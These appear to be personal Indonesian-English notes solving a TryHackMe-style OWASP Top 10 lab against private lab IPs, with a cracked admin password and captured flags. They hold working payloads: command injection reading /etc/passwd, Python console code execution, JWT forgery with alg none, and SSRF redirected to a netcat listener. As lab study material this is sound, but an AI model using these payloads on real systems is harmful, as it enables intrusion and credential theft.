# 1. IDOR :
-> change id parameter to: http://10.10.151.95/note.php?note_id=0 -> to 0

# 2. Cryptographic failure :
-> kasih port dari 10.10.151.95 ke 10.10.151.95:81
-> ctrl + u -> view source code -> ada yang ngarah ke img -> masuk ke /assets 
-> klik webapp.db
-> download webapp.db -> sqlite3 webapp.db -> .tables -> PRAGMA table_info(users) -> select * from users 
-> select password from users where username = 'admin'
-> hash pw md5 di https://crackstation.net/
-> hash pw : 6eea9b7ef19179a06954edd0f6c05ceb
-> plaintext pw : qwertyuiop
-> flag -> login as admin -> THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}


# 3. Command Injection :
-> http://10.10.47.81:82/ target
-> masukin command di input nya -> $(ls) -> .txt jawabannya
-> jawabannya 0 gatau dah
-> masukin command $(whoami) -> jawab
-> masukin command $(cat /etc/passwd) -> cari lokasi bin nya
-> masukin command $(cat /etc/os-release) -> cari version alpine nya


# 4. Insecure Design :
-> reset password di login ini : http://10.10.195.184:85/
-> pakai payload ROYGBIV -> nebak colornya paling possible
-> wordlist roygbiv di burpsuite intruder -> cek di yang length nya beda

# 5. Security Misconfiguration :
-> 10.10.198.138:86 -> ke console -> http://10.10.198.138:86/console
-> ini console python bukan bash -> kudu pake ini -> import os; print(os.popen('command nya').read());
-> ls baca file db nya 
-> cat aja flagnya


# 6. Vuln and outdate component :
-> http://10.10.103.226:84/
-> https://www.exploit-db.com/exploits/47887 -> buat exploit db nya -> download aja py nya
-> jalanin py nya -> file.py url -> nanti cat flagnya ada di opt


# 7. Identification and Authentication Failures :
-> http://10.10.164.222:8088/
-> ke register -> masukkin darren sebagai username -> dia dah ada terus register lagi tambahin spasi di depan ->" darren"
-> lakuin sama ke arthur


# 8. Software and Data integrity failures :
-> kunjungin https://www.srihash.org/ dan hash link yang disuruh ke sha-256
-> http://10.10.40.155:8089/ target -> login asal, nanti dikasih tau credentialnya -> ctrl shift i buat inspect -> cek di storage ada jwt session
-> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzIxMzAzNTY0fQ.Y5iGWecCMfcMlG3dwH1JlMtDA9tKuCvFB8ohG5Gz7Xg
-> index awal [sebelum titik] itu header -> kedua payload -> ketiga signature
-> biar admin coba index ke 2 diganti eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzIxMzAzNTY0fQ==
-> signature nya juga apus -> alg nya juga jadiin none
-> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzIxMzAzNTY0fQ==. -> dikasih titik diakhir ternyata


# 9. Security Logging and Monitoring Failures :
-> cek di file.txt
-> ip attacker using ada di kiri nickname di catatannya


# 10. SSRF [Server side request forgery] :
-> http://10.10.105.62:8087/ target
-> explore web -> admin area -> ternyata cuman nge allow localhost
-> klik download resume -> inspect element di network sebelum klik -> nah disitu ada name file yang ngarah paraneter ?server= atau href bisa jg
-> nyalakan nc -nvlp 8087 -> lalu ganti 10.10.105.62:8087/download?server=localhost:8087&id=75482342
-> localhost nya ganti ke tun / ip dari vpn thm -> jadi gini /download?server=http://ipvpn:8087/&id=75482342
-> nanti cek nc nya ada flagnya disitu
-> bonus flag dari path admin 
-> 10.10.105.62:8087/download?server=http://localhost:8087/admin%23&id=75482342 -> admin%23 itu admin# -> di pdf nya ada flag
